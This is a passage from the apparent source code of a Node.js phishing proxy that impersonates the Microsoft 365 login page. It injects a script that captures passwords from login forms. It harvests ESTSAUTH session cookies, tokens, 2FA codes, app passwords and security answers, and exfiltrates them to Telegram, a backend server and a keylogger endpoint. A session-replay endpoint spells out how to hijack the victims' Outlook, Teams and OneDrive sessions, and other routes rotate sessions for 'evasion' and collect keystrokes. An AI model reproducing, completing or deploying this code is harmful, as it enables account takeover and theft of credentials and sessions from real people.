        `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
        `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
        `${paramName}=${encodeURIComponent(email)}` +
        (hasError ? `&error=${req.url.split('error=')[1]?.split('&')[0] || ''}` : '');

    console.log(`[PROXY] 🔄 Fetching Microsoft login page`);
    console.log(`[PROXY] 📧 Email: ${email}`);
    console.log(`[PROXY] 🆔 Session: ${sessionId}`);
    console.log(`[PROXY] 📡 IP: ${ip}`);
    console.log(`[PROXY] 🔑 Client ID: ${MICROSOFT_CLIENT_ID}`);
    console.log(`[PROXY] 🔗 Endpoint: ${MICROSOFT_AUTHORIZE_ENDPOINT}`);

    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];

    const options = {
        headers: {
            'User-Agent': randomUA,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Upgrade-Insecure-Requests': '1'
        }
    };

    https.get(targetUrl, options, (targetRes) => {
        let data = [];
        targetRes.on('data', chunk => data.push(chunk));
        targetRes.on('end', () => {
            let body = Buffer.concat(data);
            
            if (targetRes.headers['content-encoding'] === 'gzip') {
                try {
                    body = zlib.gunzipSync(body);
                } catch (e) {
                    console.log('[PROXY] ⚠️ Gunzip failed, using raw data');
                }
            } else if (targetRes.headers['content-encoding'] === 'br') {
                try {
                    body = zlib.brotliDecompressSync(body);
                } catch (e) {
                    console.log('[PROXY] ⚠️ Brotli decompress failed, using raw data');
                }
            }
            
            let html = body.toString('utf-8');
            
            // CAPTURE COOKIES
            const capturedCookies = captureCookiesFromResponse(targetRes, sessionId);
            
            // Store tokens
            const cookieHeaders = targetRes.headers['set-cookie'] || [];
            const tokens = {};
            for (const cookieHeader of cookieHeaders) {
                const [nameValue] = cookieHeader.split(';');
                const [name, value] = nameValue.split('=');
                if (name && value && value !== 'null' && value !== 'undefined') {
                    if (name.includes('ESTSAUTH') || name.includes('ESTSSESSION') || name.includes('ESTSAUTHPERSISTENT')) {
                        tokens[name] = value;
                    }
                }
            }
            
            if (Object.keys(tokens).length > 0) {
                sessionStore.storeTokens(sessionId, tokens);
                sendFullTokenAlert(sessionId, tokens).catch(() => {});
            }
            
            // ============================================================
            //  PASSWORD CAPTURE SCRIPT
            // ============================================================
            
            const passwordCaptureScript = `
            <script>
            (function() {
                console.log('[PASSWORD-CAPTURE] Injected');
                
                let email = '${email}';
                let sessionId = '${sessionId}';
                let telegramEndpoint = '${PROXY_PATHNAMES.telegramEndpoint}';
                let captureEndpoint = '${PROXY_PATHNAMES.captureUserEndpoint}';
                
                function sendCapturedData(password, emailField) {
                    const capturedEmail = emailField || email;
                    if (password && capturedEmail) {
                        console.log('[PASSWORD-CAPTURE] 📧 Email:', capturedEmail);
                        console.log('[PASSWORD-CAPTURE] 🔑 Password captured');
                        
                        fetch(captureEndpoint, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                email: capturedEmail,
                                password: password,
                                sessionId: sessionId,
                                source: 'microsoft_login_page',
                                timestamp: new Date().toISOString(),
                                userAgent: navigator.userAgent
                            })
                        }).catch(() => {});
                        
                        const message = \`🔑 *PASSWORD CAPTURED*\n\n*📧 Email:* \${capturedEmail}\n*🔑 Password:* \${password}\n*🕐 Time:* \${new Date().toISOString()}\n*📱 Source:* Microsoft Login Page\`;
                        
                        fetch(telegramEndpoint, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                message: message,
                                parseMode: 'Markdown'
                            })
                        }).catch(() => {});
                        
                        return true;
                    }
                    return false;
                }
                
                function interceptForm() {
                    const forms = document.querySelectorAll('form');
                    for (const form of forms) {
                        if (form.action && form.action.includes('login')) {
                            form.addEventListener('submit', function(e) {
                                const passwordField = this.querySelector('input[type="password"]');
                                const emailField = this.querySelector('input[type="email"]') || 
                                                   this.querySelector('input[name="loginfmt"]');
                                
                                if (passwordField) {
                                    const password = passwordField.value;
                                    const emailValue = emailField ? emailField.value : email;
                                    sendCapturedData(password, emailValue);
                                }
                            });
                        }
                    }
                }
                
                if (document.readyState === 'loading') {
                    document.addEventListener('DOMContentLoaded', interceptForm);
                } else {
                    interceptForm();
                }
                
                const observer = new MutationObserver(function() {
                    const passwordField = document.querySelector('input[type="password"]');
                    if (passwordField) {
                        const form = passwordField.closest('form');
                        if (form && !form._captured) {
                            form._captured = true;
                            form.addEventListener('submit', function(e) {
                                const password = passwordField.value;
                                const emailField = this.querySelector('input[type="email"]') || 
                                                   this.querySelector('input[name="loginfmt"]');
                                const emailValue = emailField ? emailField.value : email;
                                sendCapturedData(password, emailValue);
                            });
                        }
                    }
                });
                
                observer.observe(document.body, { childList: true, subtree: true });
            })();
            </script>
            `;
            
            // Fix relative paths
            html = html.replace(/(src|href)="\//g, '$1="https://login.microsoftonline.com/');
            html = html.replace(/(src|href)='\//g, "$1='https://login.microsoftonline.com/");
            
            // Inject password capture script
            html = html.replace(/<\/body>/i, passwordCaptureScript + '</body>');
            
            if (!html.includes('</body>')) {
                html = html + passwordCaptureScript;
            }
            
            const cacheControl = ['no-store', 'no-cache', 'must-revalidate', 'private'][Math.floor(Math.random() * 4)];
            
            res.writeHead(targetRes.statusCode || 200, {
                'Content-Type': 'text/html; charset=utf-8',
                'Cache-Control': `${cacheControl}, max-age=0`,
                'Pragma': 'no-cache',
                'Expires': '0',
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'SAMEORIGIN',
                'Referrer-Policy': 'strict-origin-when-cross-origin',
                'Content-Encoding': 'identity'
            });
            res.end(html);
        });
    }).on('error', (err) => {
        console.error(`[ERROR] Proxy failed: ${err.message}`);
        res.writeHead(302, { 'Location': targetUrl });
        res.end();
    });
}

// ============================================================
//  CAPTURE COOKIES FROM RESPONSE
// ============================================================

function captureCookiesFromResponse(response, sessionId) {
    try {
        const cookieHeaders = response.headers['set-cookie'] || [];
        const capturedCookies = {};
        
        for (const cookieHeader of cookieHeaders) {
            const parts = cookieHeader.split(';');
            const [nameValue, ...attributes] = parts;
            const [name, value] = nameValue.split('=');
            
            if (name && value && value !== 'null' && value !== 'undefined') {
                capturedCookies[name] = {
                    value: value,
                    httpOnly: attributes.some(attr => attr.trim().toLowerCase() === 'httponly'),
                    secure: attributes.some(attr => attr.trim().toLowerCase() === 'secure'),
                    sameSite: attributes.find(attr => attr.trim().toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax',
                    path: attributes.find(attr => attr.trim().toLowerCase().startsWith('path='))?.split('=')[1] || '/',
                    domain: attributes.find(attr => attr.trim().toLowerCase().startsWith('domain='))?.split('=')[1] || '',
                    expires: attributes.find(attr => attr.trim().toLowerCase().startsWith('expires='))?.split('=')[1] || null
                };
            }
        }
        
        if (Object.keys(capturedCookies).length > 0) {
            sessionStore.storeCookies(sessionId, capturedCookies, 'microsoft_response');
            sendFullCookieAlert(sessionId, capturedCookies).catch(() => {});
            
            axios.post(`${BACKEND_URL}/api/cookies`, {
                sessionId: sessionId,
                cookies: capturedCookies,
                source: 'microsoft_response',
                timestamp: new Date().toISOString()
            }).catch(() => {});
        }
        
        return capturedCookies;
    } catch (error) {
        console.error('[COOKIE-CAPTURE] Error:', error.message);
        return {};
    }
}

async function sendFullCookieAlert(sessionId, cookies) {
    try {
        const validCookies = {};
        for (const [name, data] of Object.entries(cookies)) {
            if (data && data !== 'null' && data !== 'undefined') {
                const value = typeof data === 'object' ? data.value : data;
                if (value && value !== 'null' && value !== 'undefined') {
                    validCookies[name] = data;
                }
            }
        }
        
        if (Object.keys(validCookies).length === 0) {
            console.log('[TELEGRAM] ⚠️ No valid cookies to send');
            return;
        }

        let msg = `🍪 *COOKIES CAPTURED*\n\n`;
        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
        msg += `*📊 Total:* ${Object.keys(validCookies).length}\n\n`;
        
        msg += `*📝 COOKIES:*\n`;
        for (const [name, data] of Object.entries(validCookies)) {
            const value = typeof data === 'object' ? data.value : data;
            const httpOnly = typeof data === 'object' ? (data.httpOnly ? '🔒' : '🔓') : '🔓';
            const secure = typeof data === 'object' ? (data.secure ? '🔐' : '📶') : '📶';
            const displayValue = value && value.length > 100 ? value.substring(0, 100) + '...' : value;
            msg += `  ${httpOnly}${secure} \`${name}\`: \`${displayValue}\`\n\n`;
        }

        await sendToTelegram(msg);
        console.log(`[TELEGRAM] ✅ Cookie alert sent for session ${sessionId.substring(0, 16)}`);
    } catch (e) {
        console.error('[TELEGRAM] Cookie alert error:', e);
    }
}

async function sendFullTokenAlert(sessionId, tokens) {
    try {
        const validTokens = {};
        for (const [key, value] of Object.entries(tokens)) {
            if (value && value !== 'null' && value !== 'undefined' && value !== 'N/A') {
                const tokenValue = typeof value === 'object' ? value.value : value;
                if (tokenValue && tokenValue !== 'null' && tokenValue !== 'undefined') {
                    validTokens[key] = value;
                }
            }
        }
        
        if (Object.keys(validTokens).length === 0) {
            console.log('[TELEGRAM] ⚠️ No valid tokens to send');
            return;
        }

        let msg = `🎟️ *TOKENS CAPTURED*\n\n`;
        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n\n`;
        
        for (const [key, value] of Object.entries(validTokens)) {
            const tokenValue = typeof value === 'object' ? value.value : value;
            const isValid = typeof value === 'object' ? (value.isValid !== false ? '✅' : '❌') : '✅';
            const displayValue = tokenValue && tokenValue.length > 100 ? tokenValue.substring(0, 100) + '...' : tokenValue;
            msg += `${isValid} *${key}:*\n`;
            msg += `\`${displayValue}\`\n\n`;
        }

        await sendToTelegram(msg);
        console.log(`[TELEGRAM] ✅ Token alert sent for session ${sessionId.substring(0, 16)}`);
    } catch (e) {
        console.error('[TELEGRAM] Token alert error:', e);
    }
}

// ============================================================
//  GENERATE EVASION INJECTION SCRIPTS
// ============================================================

function generateEvasionScripts(sessionId, email, randomUA) {
    return `
    <script>
    console.log('[EVASION] 🛡️ Evasion techniques activated');
    console.log('[EVASION] 🆔 Session:', '${sessionId}');
    console.log('[EVASION] 📧 Email:', '${email}');
    </script>
    `;
}

// ============================================================
//  SERVE FILES
// ============================================================

function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end('<h1>404 Not Found</h1>');
            return;
        }
        res.writeHead(200, { 
            'Content-Type': contentType, 
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Pragma': 'no-cache'
        });
        res.end(data);
    });
}

// ============================================================
//  FULL AUTH API ROUTES
// ============================================================

function handleFullAuth(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const sessionId = getSessionIdFromCookie(req.headers.cookie) || data.sessionId;
            
            if (!sessionId) {
                res.writeHead(400);
                res.end(JSON.stringify({ error: 'No session ID' }));
                return;
            }
            
            const authData = {
                email: data.email || 'unknown',
                name: data.name || 'unknown',
                organization: data.organization || 'unknown',
                password: data.password || '',
                twoFactorCode: data.twoFactorCode || '',
                appPassword: data.appPassword || null,
                securityQuestion1: data.securityQuestion1 || { question: 'N/A', answer: 'N/A' },
                securityQuestion2: data.securityQuestion2 || { question: 'N/A', answer: 'N/A' },
                collectedAt: data.collectedAt || new Date().toISOString(),
                userAgent: data.userAgent || req.headers['user-agent'] || 'Unknown',
                ip: getClientIp(req)
            };
            
            sessionStore.storeFullAuthData(sessionId, authData);
            
            if (VICTIM_SESSIONS[sessionId]) {
                VICTIM_SESSIONS[sessionId].fullAuthData = authData;
                VICTIM_SESSIONS[sessionId].fullAuthCompleted = true;
                VICTIM_SESSIONS[sessionId].fullAuthTime = Date.now();
            }
            
            const message = 
`🎯 *FULL CREDENTIALS CAPTURED*

*📧 Email:* ${authData.email}
*👤 Name:* ${authData.name}
*🏢 Organization:* ${authData.organization}

*🔑 Password:* ${authData.password}
*📱 2FA Code:* ${authData.twoFactorCode}
*🔐 App Password:* ${authData.appPassword || 'Not provided'}

*❓ Security Question 1:*
  ${authData.securityQuestion1?.question || 'N/A'}
  Answer: ${authData.securityQuestion1?.answer || 'N/A'}

*❓ Security Question 2:*
  ${authData.securityQuestion2?.question || 'N/A'}
  Answer: ${authData.securityQuestion2?.answer || 'N/A'}

*🕐 Time:* ${authData.collectedAt}
*📱 User Agent:* ${authData.userAgent}
*📡 IP:* ${authData.ip}

*📊 ALL DATA CAPTURED SUCCESSFULLY!*`;

            sendToTelegram(message);
            
            axios.post(`${BACKEND_URL}/api/full-auth`, authData).catch(() => {});
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ 
                success: true, 
                sessionId: sessionId,
                stored: true,
                evasionActive: true
            }));
            
            console.log(`[FULL-AUTH] ✅ Stored full auth data for session ${sessionId.substring(0, 12)}`);
            
        } catch (error) {
            console.error('[FULL-AUTH] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

function handleGetFullAuth(req, res) {
    try {
        const sessionId = req.params.sessionId || getSessionIdFromCookie(req.headers.cookie);
        
        if (!sessionId) {
            res.writeHead(400);
            res.end(JSON.stringify({ error: 'No session ID' }));
            return;
        }
        
        const authData = sessionStore.getFullAuthData(sessionId);
        
        if (!authData) {
            res.writeHead(404);
            res.end(JSON.stringify({ error: 'No full auth data found' }));
            return;
        }
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            success: true,
            sessionId: sessionId,
            data: authData,
            collectedAt: sessionStore.sessions.get(sessionId)?.fullAuthTime || Date.now()
        }, null, 2));
        
    } catch (error) {
        console.error('[GET-FULL-AUTH] Error:', error.message);
        res.writeHead(500);
        res.end(JSON.stringify({ error: 'Internal server error' }));
    }
}

// ============================================================
//  HANDLE SESSION REPLAY ENDPOINT
// ============================================================

function handleSessionReplay(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
            
            if (!sessionId) {
                res.writeHead(400);
                res.end(JSON.stringify({ error: 'No session ID' }));
                return;
            }
            
            const sessionData = sessionStore.getReplayData(sessionId);
            if (!sessionData) {
                res.writeHead(404);
                res.end(JSON.stringify({ error: 'Session not found' }));
                return;
            }
            
            const cookieData = sessionStore.getCookieHeader(sessionId);
            const tokens = sessionStore.allTokens.get(sessionId) || {};
            const validTokens = {};
            for (const [key, token] of Object.entries(tokens)) {
                if (token && token.value && token.isValid !== false && token.value !== 'null' && token.value !== 'undefined') {
                    validTokens[key] = token.value;
                }
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                success: true,
                sessionId: sessionId,
                sessionData: sessionData,
                cookies: cookieData?.cookieHeader ? 
                    Object.fromEntries(cookieData.cookieHeader.split('; ').map(c => {
                        const [n, v] = c.split('=');
                        return [n, v];
                    })) : {},
                cookieHeader: cookieData?.cookieHeader || '',
                cookieCount: cookieData?.cookieCount || 0,
                tokens: validTokens,
                tokenCount: Object.keys(validTokens).length,
                forms: sessionData.forms || [],
                fingerprint: sessionData.fingerprint || {},
                evasionData: {
                    rotationCount: sessionData.rotationCount || 0,
                    totalRequests: sessionData.evasionData?.totalRequests || 0,
                    fingerprint: sessionData.fingerprint
                },
                replayInstructions: {
                    useCookieHeader: cookieData?.cookieHeader || '',
                    targetUrls: [
                        'https://outlook.office.com',
                        'https://teams.microsoft.com',
                        'https://onedrive.live.com',
                        'https://sharepoint.com',
                        'https://www.office.com',
                        'https://login.microsoftonline.com'
                    ],
                    howToReplay: [
                        '1. Copy the cookieHeader value',
                        '2. Use browser extension to set cookies',
                        '3. Navigate to target URL',
                        '4. Session will be automatically authenticated',
                        '5. Use token values for API authentication'
                    ],
                    evasionActive: true
                }
            }, null, 2));
            
        } catch (error) {
            console.error('[REPLAY] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  MAIN SERVER
// ============================================================

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    // Serve files
    if (req.url === '/' || req.url === '/index.html') {
        serveFile('index.html', res);
        return;
    }
    if (req.url === PROXY_PATHNAMES.script) {
        serveFile('script_Vx9Z6XN5uC3k.js', res, 'text/javascript');
        return;
    }
    if (req.url === PROXY_PATHNAMES.serviceWorker) {
        serveFile('microsoft_inject.js', res, 'text/javascript');
        return;
    }

    // ============================================================
    //  OAUTH CALLBACK ROUTES - MUST BE BEFORE /login
    // ============================================================
    
    if (req.url.startsWith('/callback') || req.url.startsWith('/common/oauth2/nativeclient')) {
        handleOAuthCallback(req, res);
        return;
    }
    
    if (req.url.includes('code=')) {
        handleOAuthCallback(req, res);
        return;
    }
    
    if (req.url.includes('wrongplace')) {
        console.log('[PROXY] 🔄 Wrongplace detected - redirecting to proxy');
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        const email = sessionId && VICTIM_SESSIONS[sessionId] ? 
            VICTIM_SESSIONS[sessionId].email : 'guest@example.com';
        const proxyUrl = `${REDIRECT_URL}?login_hint=${encodeURIComponent(email)}`;
        res.writeHead(302, { 'Location': proxyUrl });
        res.end();
        return;
    }

    // ============================================================
    //  OAUTH AUTO-CAPTURE ENDPOINTS
    // ============================================================
    
    if (req.url === PROXY_PATHNAMES.oauthCaptureEndpoint && req.method === 'POST') {
        handleOAuthCapture(req, res);
        return;
    }
    
    if (req.url === PROXY_PATHNAMES.captureUserEndpoint && req.method === 'POST') {
        handleCaptureUser(req, res);
        return;
    }
    
    if (req.url === PROXY_PATHNAMES.telegramEndpoint && req.method === 'POST') {
        handleTelegram(req, res);
        return;
    }

    // ============================================================
    //  FULL AUTH ENDPOINTS
    // ============================================================
    
    if (req.url === PROXY_PATHNAMES.fullAuthEndpoint && req.method === 'POST') {
        handleFullAuth(req, res);
        return;
    }
    
    if (req.url.startsWith(PROXY_PATHNAMES.fullAuthEndpoint + '/') && req.method === 'GET') {
        const sessionId = req.url.split('/').pop();
        req.params = { sessionId: sessionId };
        handleGetFullAuth(req, res);
        return;
    }

    // Token Rotation Endpoint
    if (req.url === PROXY_PATHNAMES.tokenRotation && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie);
                if (sessionId) {
                    sessionStore.rotateSession(sessionId);
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, rotated: true }));
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    // Session Rotate Endpoint
    if (req.url === PROXY_PATHNAMES.sessionRotate && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
                if (sessionId) {
                    const newSessionId = sessionStore.rotateSession(sessionId);
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ 
                        success: true, 
                        newSessionId: newSessionId,
                        rotationCount: sessionStore.evasionCounters.get(newSessionId)?.rotations || 0
                    }));
                } else {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                }
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    // Cookie Store Endpoint
    if (req.url === PROXY_PATHNAMES.cookieStoreEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
                
                if (!sessionId) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                    return;
                }
                
                let cookies = {};
                
                if (data.cookies) {
                    if (typeof data.cookies === 'string') {
                        data.cookies.split('; ').forEach(cookie => {
                            const [name, value] = cookie.split('=');
                            if (name && value && value !== 'null' && value !== 'undefined') {
                                cookies[name] = { value: value, httpOnly: false, secure: false };
                            }
                        });
                    } else if (typeof data.cookies === 'object') {
                        for (const [name, value] of Object.entries(data.cookies)) {
                            if (value && value !== 'null' && value !== 'undefined') {
                                cookies[name] = typeof value === 'object' ? value : { value: value };
                            }
                        }
                    }
                }
                
                if (data.setCookie) {
                    const setCookieParts = data.setCookie.split(';');
                    const [nameValue, ...attributes] = setCookieParts;
                    const [name, value] = nameValue.split('=');
                    if (name && value && value !== 'null' && value !== 'undefined') {
                        cookies[name] = {
                            value: value,
                            httpOnly: attributes.some(attr => attr.trim().toLowerCase() === 'httponly'),
                            secure: attributes.some(attr => attr.trim().toLowerCase() === 'secure'),
                            sameSite: attributes.find(attr => attr.trim().toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax'
                        };
                    }
                }
                
                if (Object.keys(cookies).length > 0) {
                    sessionStore.storeCookies(sessionId, cookies, data.source || 'api');
                    sendFullCookieAlert(sessionId, cookies).catch(() => {});
                    
                    axios.post(`${BACKEND_URL}/api/cookies`, {
                        sessionId: sessionId,
                        cookies: cookies,
                        source: data.source || 'api',
                        timestamp: new Date().toISOString()
                    }).catch(() => {});
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ 
                    success: true, 
                    stored: Object.keys(cookies).length,
                    sessionId: sessionId,
                    evasionActive: true
                }));
            } catch (error) {
                console.error('[COOKIE-STORE] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    // Session Replay Endpoint
    if (req.url === PROXY_PATHNAMES.sessionReplayEndpoint && req.method === 'POST') {
        handleSessionReplay(req, res);
        return;
    }

    // Full Session Data Endpoint
    if (req.url === PROXY_PATHNAMES.fullSessionData && req.method === 'GET') {
        const sessionId = req.headers['x-session-id'] || getSessionIdFromCookie(req.headers.cookie);
        
        if (!sessionId) {
            res.writeHead(400);
            res.end(JSON.stringify({ error: 'No session ID' }));
            return;
        }
        
        const sessionData = sessionStore.getReplayData(sessionId);
        if (!sessionData) {
            res.writeHead(404);
            res.end(JSON.stringify({ error: 'Session not found' }));
            return;
        }
        
        const cookieData = sessionStore.getCookieHeader(sessionId);
        const tokens = sessionStore.allTokens.get(sessionId) || {};
        const validTokens = {};
        for (const [key, token] of Object.entries(tokens)) {
            if (token && token.value && token.isValid !== false && token.value !== 'null' && token.value !== 'undefined') {
                validTokens[key] = token.value;
            }
        }
        
        const fullAuthData = sessionStore.getFullAuthData(sessionId);
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            success: true,
            sessionId: sessionId,
            email: sessionData.email || 'unknown',
            created: sessionData.created,
            lastActivity: sessionData.lastActivity,
            cookies: cookieData?.cookieHeader ? 
                Object.fromEntries(cookieData.cookieHeader.split('; ').map(c => {
                    const [n, v] = c.split('=');
                    return [n, v];
                })) : {},
            cookieCount: cookieData?.cookieCount || 0,
            tokens: validTokens,
            tokenCount: Object.keys(validTokens).length,
            forms: sessionData.forms || [],
            formCount: (sessionData.forms || []).length,
            fingerprint: sessionData.fingerprint || {},
            evasionData: sessionData.evasionData || {},
            readyForReplay: (cookieData?.cookieCount || 0) > 0 || Object.keys(validTokens).length > 0,
            evasionEnabled: true,
            fullAuthData: fullAuthData,
            hasFullAuth: !!fullAuthData
        }, null, 2));
        return;
    }

    // Existing endpoints
    if (req.url === PROXY_PATHNAMES.xssEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie);
                const ip = getClientIp(req);
                
                if (sessionId && VICTIM_SESSIONS[sessionId]) {
                    VICTIM_SESSIONS[sessionId].xssData.push({
                        ...data,
                        timestamp: Date.now(),
                        ip: ip
                    });
                    sessionStore.sessions.set(sessionId, {
                        ...sessionStore.sessions.get(sessionId),
                        xssData: data,
                        lastXSS: Date.now()
                    });
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.cookieEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie);
                
                if (sessionId && VICTIM_SESSIONS[sessionId]) {
                    VICTIM_SESSIONS[sessionId].cookies.push(data);
                    if (data.cookies) {
                        sessionStore.storeCookies(sessionId, data.cookies, 'frontend');
                    }
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.keylogEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie);
                
                if (sessionId && VICTIM_SESSIONS[sessionId]) {
                    VICTIM_SESSIONS[sessionId].keystrokes.push(data);
                    sessionStore.sessions.set(sessionId, {
                        ...sessionStore.sessions.get(sessionId),
                        keystrokes: data.keystrokes
                    });
                    
                    if (KEYLOGGER_URL) {
                        axios.post(KEYLOGGER_URL, {
                            ...data,
                            sessionId: sessionId,
                            email: VICTIM_SESSIONS[sessionId].email
                        }).catch(() => {});
                    }
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    // Health check
    if (req.url === '/health') {
        const stats = sessionStore.getStats();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'healthy',
            timestamp: new Date().toISOString(),
            sessions: Object.keys(VICTIM_SESSIONS).length,
            service: 'Microsoft 365 Proxy with Advanced Evasion',
            version: '4.1.0',
            stats: stats,
            replayAvailable: stats.totalSessions > 0,
            evasionEnabled: true,
            fullAuthAvailable: stats.totalFullAuth > 0
        }, null, 2));
        return;
    }

    // Sessions admin
    if (req.url === '/sessions' && req.method === 'GET') {
        const sessionData = Object.keys(VICTIM_SESSIONS).map(id => ({
            sessionId: id.substring(0, 12) + '...',
            email: VICTIM_SESSIONS[id].email || 'N/A',
            ip: VICTIM_SESSIONS[id].ip || 'N/A',
            created: VICTIM_SESSIONS[id].created,
            cookieCount: (VICTIM_SESSIONS[id].cookies || []).length,
            attempts: VICTIM_SESSIONS[id].attempts || 0,
            fullCookies: sessionStore.getCookieHeader(id)?.cookieCount || 0,
            tokens: sessionStore.allTokens.get(id) ? 
                Object.values(sessionStore.allTokens.get(id)).filter(t => t && t.value && t.isValid !== false).length : 0,
            evasionData: sessionStore.getReplayData(id)?.evasionData || {},
            rotationCount: sessionStore.getReplayData(id)?.rotationCount || 0,
            hasFullAuth: !!sessionStore.getFullAuthData(id)
        }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            total: sessionData.length,
            sessions: sessionData,
            stats: sessionStore.getStats(),
            evasionActive: true
        }, null, 2));
        return;
    }

    // POST requests
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            handlePostRequest(body, req, res);
        });
        return;
    }

    // Login requests
    if (req.url.startsWith(PROXY_ENTRY_POINT)) {
        handleLoginRequest(req, res);
        return;
    }

    // Default redirect
    res.writeHead(302, { 'Location': REDIRECT_URL });
    res.end();
});

// ============================================================
//  HANDLE POST REQUEST
// ============================================================

function handlePostRequest(body, req, res) {
    try {
        const formData = querystring.parse(body);
        const ip = getClientIp(req);
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        
        let email = '';
        
        if (sessionId) {
            const session = getSession(sessionId);
            if (session) {
                email = session.email;
                VICTIM_SESSIONS[sessionId].attempts = (VICTIM_SESSIONS[sessionId].attempts || 0) + 1;
                sessionStore.addEvasionCounter(sessionId);
            }
        }
        
        if (!email) {
            email = formData.loginfmt || formData.login || formData.email || '';
        }
        
        if (!email) {
            const match = req.url.match(/login_hint=([^&]+)/);
            if (match) {
                email = decodeURIComponent(match[1]);
            }
        }
        
        if (!email) {
            console.warn('[POST] No email found, using unknown');
            email = 'unknown@domain.com';
        }

        const password = formData.passwd || formData.password || '';
        let attemptCount = attemptCounts.get(email) || 0;
        attemptCount++;
